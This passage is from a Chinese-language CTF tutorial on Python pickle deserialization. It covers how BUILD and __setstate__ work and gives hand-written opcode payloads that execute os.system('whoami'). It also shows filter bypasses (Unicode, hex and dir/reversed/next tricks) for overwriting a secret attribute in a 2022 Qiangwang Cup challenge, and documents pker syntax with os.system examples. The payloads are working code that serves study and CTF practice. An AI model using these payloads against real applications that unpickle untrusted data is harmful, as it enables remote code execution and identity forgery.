<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> pickle<br> <br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, age=<span class="hljs-number">0</span></span>):<br>        self.name = name<br>        self.age = age<br> <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__str__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;name: <span class="hljs-subst">&#123;self.name&#125;</span>\nage: <span class="hljs-subst">&#123;self.age&#125;</span>&quot;</span><br> <br> <br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Child</span>(<span class="hljs-title class_ inherited__">Person</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__setstate__</span>(<span class="hljs-params">self, state</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;invoke __setstate__&quot;</span>)<br>        self.name=state<br>        self.age=<span class="hljs-number">10</span><br> <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__getstate__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;invoke __getstate__&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Child&quot;</span><br> <br> <br>c1=Child(<span class="hljs-string">&quot;TEST&quot;</span>)<br><span class="hljs-built_in">print</span>(c1)<br><span class="hljs-comment">#name: TEST</span><br><span class="hljs-comment">#age: 0</span><br> <br> <br>opcode=pickle.dumps(c1,protocol=<span class="hljs-number">0</span>)<br><span class="hljs-built_in">print</span>(opcode)<br><span class="hljs-comment">#invoke __getstate__</span><br><span class="hljs-comment">#b&#x27;ccopy_reg\n_reconstructor\np0\n(c__main__\nChild\np1\nc__builtin__\nobject\np2\nNtp3\nRp4\nVChild\np5\nb.&#x27;</span><br> <br>c2=pickle.loads(opcode)<br><span class="hljs-built_in">print</span>(c2)<br><span class="hljs-comment">#invoke __setstate__</span><br><span class="hljs-comment">#name: Child</span><br><span class="hljs-comment">#age: 10</span><br></code></pre></td></tr></table></figure>
<p>当对象被序列化时调用<code>__getstate__</code>，被反序列化时调用<code>__setstate__</code>。重写时可以省略<code>__setstate__</code>，但<code>__getstate__</code>必须返回一个字典。如果<code>__getstate__</code>与<code>__setstate__</code>都被省略, 那么就默认自动保存和加载对象的属性字典<code>__dict__</code>。</p>
<p>在pickle源码中，字节码<code>b</code>对应的是<code>load_build()</code>函数</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">def</span> <span class="hljs-title function_">load_build</span>(<span class="hljs-params">self</span>):<br>    stack = self.stack<br>    state = stack.pop()<br>    <span class="hljs-comment">#首先获取栈上的字节码b前的一个元素，对于对象来说，该元素一般是存储有对象属性的dict</span><br>    inst = stack[-<span class="hljs-number">1</span>]<br>    <span class="hljs-comment">#获取该字典中键名为&quot;__setstate__&quot;的value</span><br>    setstate = <span class="hljs-built_in">getattr</span>(inst, <span class="hljs-string">&quot;__setstate__&quot;</span>, <span class="hljs-literal">None</span>)<br>    <span class="hljs-comment">#如果存在，则执行value(state)</span><br>    <span class="hljs-keyword">if</span> setstate <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>        setstate(state)<br>        <span class="hljs-keyword">return</span><br>    slotstate = <span class="hljs-literal">None</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(state, <span class="hljs-built_in">tuple</span>) <span class="hljs-keyword">and</span> <span class="hljs-built_in">len</span>(state) == <span class="hljs-number">2</span>:<br>        state, slotstate = state<br>    <span class="hljs-comment">#如果&quot;__setstate__&quot;为空，则state与对象默认的__dict__合并，这一步其实就是将序列化前保存的持久化属性和对象属性字典合并</span><br>    <span class="hljs-keyword">if</span> state:<br>        inst_dict = inst.__dict__<br>        intern = sys.intern<br>        <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> state.items():<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(k) <span class="hljs-keyword">is</span> <span class="hljs-built_in">str</span>:<br>                inst_dict[intern(k)] = v<br>            <span class="hljs-keyword">else</span>:<br>                inst_dict[k] = v<br>    <span class="hljs-comment">#如果__setstate__和__getstate__都没有设置，则加载默认__dict__</span><br>    <span class="hljs-keyword">if</span> slotstate:<br>        <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> slotstate.items():<br>            <span class="hljs-built_in">setattr</span>(inst, k, v)<br>dispatch[BUILD[<span class="hljs-number">0</span>]] = load_build<br></code></pre></td></tr></table></figure>
<p>那么这有什么安全问题呢？如果我们将字典<code>&#123;&quot;__setstate__&quot;:os.system&#125;</code>，压入栈中，并执行<code>b</code>字节码，，由于此时并没有<code>__setstate__</code>，所以这里b字节码相当于执行了<code>__dict__.update</code>，向对象的属性字典中添加了一对新的键值对。如果我们继续向栈中压入命令command，再次执行<code>b</code>字节码时，由于已经有了<code>__setstate__</code>，所以会将栈中字节码<code>b</code>的前一个元素当作<code>state</code>，执行<code>__setstate__(state)</code>，也就是<code>os.system(command)</code>。</p>
<p>Payload如下</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs py">opcode=<span class="hljs-string">b&#x27;&#x27;&#x27;(c__main__</span><br><span class="hljs-string">Animal</span><br><span class="hljs-string">S&#x27;Casual&#x27;</span><br><span class="hljs-string">I18</span><br><span class="hljs-string">o&#125;(S&quot;__setstate__&quot;    #向栈中压入一个空字典，然后再通过u修改为&#123;&quot;__setstate__&quot;:os.system&#125;</span><br><span class="hljs-string">cos</span><br><span class="hljs-string">system</span><br><span class="hljs-string">ubS&quot;whoami&quot;</span><br><span class="hljs-string">b.&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure>
<p>执行结果如下，成功RCE</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> stao<br><span class="hljs-keyword">import</span> pickletools<br> <br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Animal</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, category</span>):<br>        self.name = name<br>        self.category = category<br> <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__eq__</span>(<span class="hljs-params">self, other</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">type</span>(other) <span class="hljs-keyword">is</span> Animal <span class="hljs-keyword">and</span> self.name == other.name <span class="hljs-keyword">and</span> self.category == other.category<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span>(<span class="hljs-params">data</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;R&#x27;</span> <span class="hljs-keyword">in</span> data:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;no reduce!&#x27;</span><br>    x=pickle.loads(data)<br>    <span class="hljs-keyword">if</span>(x!= Animal(stao.name,stao.age)):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;not equal&#x27;</span>)<br>        <span class="hljs-keyword">return</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;well done! &#123;&#125; &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(stao.name,stao.age))<br> <br>opcode=<span class="hljs-string">b&#x27;&#x27;&#x27;(c__main__</span><br><span class="hljs-string">Animal</span><br><span class="hljs-string">S&#x27;Casual&#x27;</span><br><span class="hljs-string">I18</span><br><span class="hljs-string">o&#125;(S&quot;__setstate__&quot;</span><br><span class="hljs-string">cos</span><br><span class="hljs-string">system</span><br><span class="hljs-string">ubS&quot;whoami&quot;</span><br><span class="hljs-string">b.&#x27;&#x27;&#x27;</span><br>check(opcode)<br>pickletools.dis(opcode)<br> <br><span class="hljs-comment">###</span><br>xiaoh\<span class="hljs-number">34946</span><br><span class="hljs-keyword">not</span> equal<br>    <span class="hljs-number">0</span>: (    MARK<br>    <span class="hljs-number">1</span>: c        GLOBAL     <span class="hljs-string">&#x27;__main__ Animal&#x27;</span><br>   <span class="hljs-number">18</span>: S        STRING     <span class="hljs-string">&#x27;Casual&#x27;</span><br>   <span class="hljs-number">28</span>: I        INT        <span class="hljs-number">18</span><br>   <span class="hljs-number">32</span>: o        OBJ        (MARK at <span class="hljs-number">0</span>)<br>   <span class="hljs-number">33</span>: &#125;    EMPTY_DICT<br>   <span class="hljs-number">34</span>: (    MARK<br>   <span class="hljs-number">35</span>: S        STRING     <span class="hljs-string">&#x27;__setstate__&#x27;</span><br>   <span class="hljs-number">51</span>: c        GLOBAL     <span class="hljs-string">&#x27;os system&#x27;</span><br>   <span class="hljs-number">62</span>: u        SETITEMS   (MARK at <span class="hljs-number">34</span>)<br>   <span class="hljs-number">63</span>: b    BUILD<br>   <span class="hljs-number">64</span>: S    STRING     <span class="hljs-string">&#x27;whoami&#x27;</span><br>   <span class="hljs-number">74</span>: b    BUILD<br>   <span class="hljs-number">75</span>: .    STOP<br>highest protocol among opcodes = <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
<h2 id="7-3-绕过关键字过滤"><a href="#7-3-绕过关键字过滤" class="headerlink" title="7-3-绕过关键字过滤"></a>7.3 绕过关键字过滤</h2>
<p>在某些情况下，假如我们想利用opcode进行变量覆盖从而进行身份伪造，但是代码中过滤了我们想要覆盖的属性关键字。比如[2022强网杯 crash]，关键代码如下</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, username,password</span>):<br>        self.username=username<br>        self.token=<span class="hljs-built_in">hash</span>(password)<br> <br> <br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/balancer&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">flag</span>():<br>    pickle_data=base64.b64decode(request.cookies.get(<span class="hljs-string">&quot;userdata&quot;</span>))<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;R&#x27;</span> <span class="hljs-keyword">in</span> pickle_data <span class="hljs-keyword">or</span> <span class="hljs-string">b&quot;secret&quot;</span> <span class="hljs-keyword">in</span> pickle_data:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;You damm hacker!&quot;</span><br>    os.system(<span class="hljs-string">&quot;rm -rf *py*&quot;</span>)<br>    userdata=pickle.loads(pickle_data)<br>    <span class="hljs-keyword">if</span> userdata.token!=<span class="hljs-built_in">hash</span>(get_password(userdata.username)):<br>         <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Login First&quot;</span><br>    <span class="hljs-keyword">if</span> userdata.username==<span class="hljs-string">&#x27;admin&#x27;</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Welcome admin, here is your next challenge!&quot;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;You&#x27;re not admin!&quot;</span><br></code></pre></td></tr></table></figure>
<p>源码引入<code>admin</code>模块，其中存放了属性<code>secret</code>。现在题目过滤了属性名，现在如何进行绕过呢？下面给出三种思路</p>
<h3 id="利用V指令进行Unicode绕过"><a href="#利用V指令进行Unicode绕过" class="headerlink" title="利用V指令进行Unicode绕过"></a>利用V指令进行Unicode绕过</h3>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py">V`指令的用法如下，类似于指令`S<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20231117190758654.png'><img src="image-20231117190758654.png" alt="image-20231117190758654"></p>
<p>正常我们可以构造变量覆盖如下来绕过比较</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-string">b&#x27;&#x27;&#x27;capp</span><br><span class="hljs-string">admin</span><br><span class="hljs-string">(S&#x27;secret&#x27;</span><br><span class="hljs-string">I1</span><br><span class="hljs-string">db0(capp</span><br><span class="hljs-string">User</span><br><span class="hljs-string">S&quot;admin&quot;</span><br><span class="hljs-string">I1</span><br><span class="hljs-string">o.&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure>
<p>过滤了secret之后可以构造如下</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-string">b&#x27;&#x27;&#x27;capp</span><br><span class="hljs-string">admin</span><br><span class="hljs-string">(Vsecr\u0065t</span><br><span class="hljs-string">I1</span><br><span class="hljs-string">db0(capp</span><br><span class="hljs-string">User</span><br><span class="hljs-string">S&quot;admin&quot;</span><br><span class="hljs-string">I1</span><br><span class="hljs-string">o.&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure>
<h3 id="十六进制绕过"><a href="#十六进制绕过" class="headerlink" title="十六进制绕过"></a>十六进制绕过</h3>
<p>操作码<code>S</code>也能够识别十六进制字符串，可以构造如下</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-string">b&#x27;&#x27;&#x27;capp</span><br><span class="hljs-string">admin</span><br><span class="hljs-string">(S&#x27;\x73ecret&#x27;</span><br><span class="hljs-string">I1</span><br><span class="hljs-string">db0(capp</span><br><span class="hljs-string">User</span><br><span class="hljs-string">S&quot;admin&quot;</span><br><span class="hljs-string">I1</span><br><span class="hljs-string">o.&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure>
<h3 id="利用内置函数获取关键字"><a href="#利用内置函数获取关键字" class="headerlink" title="利用内置函数获取关键字"></a>利用内置函数获取关键字</h3>
<p>对于已导入的模块，我们可以通过<code>sys.modules['xxx']</code>来获取该模块，然后通过<a target="_blank" rel="noopener" href="https://docs.python.org/zh-cn/3.7/library/functions.html">内置函数</a>dir()来列出模块中的所有属性</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-built_in">print</span>(<span class="hljs-built_in">dir</span>(sys.modules[<span class="hljs-string">&#x27;admin&#x27;</span>]))<br> <br><span class="hljs-comment">#[&#x27;__builtins__&#x27;, &#x27;__cached__&#x27;, &#x27;__doc__&#x27;, &#x27;__file__&#x27;, &#x27;__loader__&#x27;, &#x27;__name__&#x27;, &#x27;__package__&#x27;, &#x27;__spec__&#x27;, &#x27;secret&#x27;]</span><br></code></pre></td></tr></table></figure>
<p>可以看到模块中的属性是以列表的形式输出，且我们所需的字符串位于列表末尾。</p>
<p>由于pickle不支持列表索引、字典索引，所以我们不能直接获取所需的字符串。在Python中，我们可以通过<code>reversed()</code>函数来将列表逆序，并返回一个迭代对象</p>
<p class='item-img' data-src='image-20231117190837401.png'><img src="image-20231117190837401.png" alt="image-20231117190837401"></p>
<p>然后我们可以通过<code>next()</code>函数来获取迭代对象的下一个元素，默认从第一个元素开始。最终可以构造如下</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-built_in">print</span>(<span class="hljs-built_in">next</span>(<span class="hljs-built_in">reversed</span>(<span class="hljs-built_in">dir</span>(sys.modules[<span class="hljs-string">&#x27;admin&#x27;</span>]))))<br> <br><span class="hljs-comment">#secret</span><br></code></pre></td></tr></table></figure>
<p>这类似PHP的无参数RCE</p>
<p>opcode构造如下</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs py">opcode=<span class="hljs-string">b&#x27;&#x27;&#x27;(((((c__main__</span><br><span class="hljs-string">admin</span><br><span class="hljs-string">i__builtin__</span><br><span class="hljs-string">dir</span><br><span class="hljs-string">i__builtin__</span><br><span class="hljs-string">reversed</span><br><span class="hljs-string">i__builtin__</span><br><span class="hljs-string">next</span><br><span class="hljs-string">.&#x27;&#x27;&#x27;</span><br><span class="hljs-built_in">print</span>(pickle.loads(opcode))<br> <br><span class="hljs-comment">#secret</span><br></code></pre></td></tr></table></figure>
<p>获取到了secret字符串，下面就容易构造变量覆盖了</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs py">opcode = <span class="hljs-string">b&#x27;&#x27;&#x27;c__main__</span><br><span class="hljs-string">admin</span><br><span class="hljs-string">(((((c__main__</span><br><span class="hljs-string">admin</span><br><span class="hljs-string">i__builtin__</span><br><span class="hljs-string">dir</span><br><span class="hljs-string">i__builtin__</span><br><span class="hljs-string">reversed</span><br><span class="hljs-string">i__builtin__</span><br><span class="hljs-string">next</span><br><span class="hljs-string">I1</span><br><span class="hljs-string">db(S&#x27;admin&#x27;</span><br><span class="hljs-string">I1</span><br><span class="hljs-string">i__main__</span><br><span class="hljs-string">User</span><br><span class="hljs-string">.&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure>
<h1>0x08 pker使用说明</h1>
<h2 id="8-1-简介"><a href="#8-1-简介" class="headerlink" title="8-1-简介"></a>8.1 简介</h2>
<ul>
<li>pker是由@eddieivan01编写的以仿照Python的形式产生pickle opcode的解析器，可以在<a target="_blank" rel="noopener" href="https://github.com/eddieivan01/pker%E4%B8%8B%E8%BD%BD%E6%BA%90%E7%A0%81%E3%80%82">https://github.com/eddieivan01/pker下载源码。</a></li>
<li>使用pker，我们可以更方便地编写pickle opcode（生成pickle版本0的opcode）。</li>
<li>再次建议，在能够手写opcode的情况下使用pker进行辅助编写，不要过分依赖pker。</li>
<li>此外，pker的实现用到了python的ast（抽象语法树）库，抽象语法树也是一个很重要东西，有兴趣的可以研究一下ast库和pker的源码，由于篇幅限制，这里不再叙述。</li>
</ul>
<h2 id="8-2-pker能做的事"><a href="#8-2-pker能做的事" class="headerlink" title="8-2-pker能做的事"></a>8.2 pker能做的事</h2>
<p>引用自<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7012#toc-5%EF%BC%9A">https://xz.aliyun.com/t/7012#toc-5：</a></p>
<blockquote>
<ul>
<li>变量赋值：存到memo中，保存memo下标和变量名即可</li>
<li>函数调用</li>
<li>类型字面量构造</li>
<li>list和dict成员修改</li>
<li>对象成员变量修改</li>
</ul>
</blockquote>
<p>具体来讲，可以使用pker进行原变量覆盖、函数执行、实例化新的对象。</p>
<h2 id="8-3-使用方法与示例"><a href="#8-3-使用方法与示例" class="headerlink" title="8-3-使用方法与示例"></a>8.3 使用方法与示例</h2>
<ol>
<li>pker中的针对pickle的特殊语法需要重点掌握（后文给出示例）</li>
<li>此外我们需要注意一点：python中的所有类、模块、包、属性等都是对象，这样便于对各操作进行理解。</li>
<li>pker主要用到<code>GLOBAL、INST、OBJ</code>三种特殊的函数以及一些必要的转换方式，其他的opcode也可以手动使用：</li>
</ol>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs py">以下module都可以是包含`.`的子module<br>调用函数时，注意传入的参数类型要和示例一致<br>对应的opcode会被生成，但并不与pker代码相互等价<br><br>GLOBAL<br>对应opcode：<span class="hljs-string">b&#x27;c&#x27;</span><br>获取module下的一个全局对象（没有<span class="hljs-keyword">import</span>的也可以，比如下面的os）：<br>GLOBAL(<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>)<br>输入：module,instance(<span class="hljs-built_in">callable</span>、module都是instance)  <br><br>INST<br>对应opcode：<span class="hljs-string">b&#x27;i&#x27;</span><br>建立并入栈一个对象（可以执行一个函数）：<br>INST(<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>, <span class="hljs-string">&#x27;ls&#x27;</span>)  <br>输入：module,<span class="hljs-built_in">callable</span>,para <br><br>OBJ<br>对应opcode：<span class="hljs-string">b&#x27;o&#x27;</span><br>建立并入栈一个对象（传入的第一个参数为<span class="hljs-built_in">callable</span>，可以执行一个函数））：<br>OBJ(GLOBAL(<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>), <span class="hljs-string">&#x27;ls&#x27;</span>) <br>输入：<span class="hljs-built_in">callable</span>,para<br><br>xxx(xx,...)<br>对应opcode：<span class="hljs-string">b&#x27;R&#x27;</span><br>使用参数xx调用函数xxx（先将函数入栈，再将参数入栈并调用）<br><br>li[<span class="hljs-number">0</span>]=<span class="hljs-number">321</span><br>或<br>globals_dic[<span class="hljs-string">&#x27;local_var&#x27;</span>]=<span class="hljs-string">&#x27;hello&#x27;</span><br>对应opcode：<span class="hljs-string">b&#x27;s&#x27;</span><br>更新列表或字典的某项的值<br><br>xx.attr=<span class="hljs-number">123</span><br>对应opcode：<span class="hljs-string">b&#x27;b&#x27;</span><br>对xx对象进行属性设置<br><br><span class="hljs-keyword">return</span><br>对应opcode：<span class="hljs-string">b&#x27;0&#x27;</span><br>出栈（作为pickle.loads函数的返回值）：<br><span class="hljs-keyword">return</span> xxx <span class="hljs-comment"># 注意，一次只能返回一个对象或不返回对象（就算用逗号隔开，最后也只返回一个元组）</span><br></code></pre></td></tr></table></figure>
<p>注意：</p>
<ol>
<li>由于opcode本身的功能问题，pker肯定也不支持列表索引、字典索引、点号取对象属性作为<strong>左值</strong>，需要索引时只能先获取相应的函数（如<code>getattr</code>、<code>dict.get</code>）才能进行。但是因为存在<code>s</code>、<code>u</code>、<code>b</code>操作符，<strong>作为右值是可以的</strong>。即“查值不行，赋值可以”。</li>
<li>pker解析<code>S</code>时，用单引号包裹字符串。所以pker代码中的双引号会被解析为单引号opcode:</li>
</ol>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs py">test=<span class="hljs-string">&quot;123&quot;</span><br><span class="hljs-keyword">return</span> test<br></code></pre></td></tr></table></figure>
<p>被解析为：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-string">b&quot;S&#x27;123&#x27;\np0\n0g0\n.&quot;</span><br></code></pre></td></tr></table></figure>
<h3 id="pker：全局变量覆盖"><a href="#pker：全局变量覆盖" class="headerlink" title="pker：全局变量覆盖"></a>pker：全局变量覆盖</h3>
<ul>
<li>覆盖直接由执行文件引入的<code>secret</code>模块中的<code>name</code>与<code>category</code>变量：</li>
</ul>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs py">secret=GLOBAL(<span class="hljs-string">&#x27;__main__&#x27;</span>, <span class="hljs-string">&#x27;secret&#x27;</span>) <br><span class="hljs-comment"># python的执行文件被解析为__main__对象，secret在该对象从属下</span><br>secret.name=<span class="hljs-string">&#x27;1&#x27;</span><br>secret.category=<span class="hljs-string">&#x27;2&#x27;</span><br></code></pre></td></tr></table></figure>
<ul>
<li>覆盖引入模块的变量：</li>
</ul>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs py">game = GLOBAL(<span class="hljs-string">&#x27;guess_game&#x27;</span>, <span class="hljs-string">&#x27;game&#x27;</span>)<br>game.curr_ticket = <span class="hljs-string">&#x27;123&#x27;</span><br></code></pre></td></tr></table></figure>
<p>接下来会给出一些具体的基本操作的实例。</p>
<h3 id="pker：函数执行"><a href="#pker：函数执行" class="headerlink" title="pker：函数执行"></a>pker：函数执行</h3>
<ul>
<li>通过<code>b'R'</code>调用：</li>
</ul>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs py">s=<span class="hljs-string">&#x27;whoami&#x27;</span><br>system = GLOBAL(<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>)<br>system(s) <span class="hljs-comment"># `b&#x27;R&#x27;`调用</span><br><span class="hljs-keyword">return</span><br></code></pre></td></tr></table></figure>
<ul>
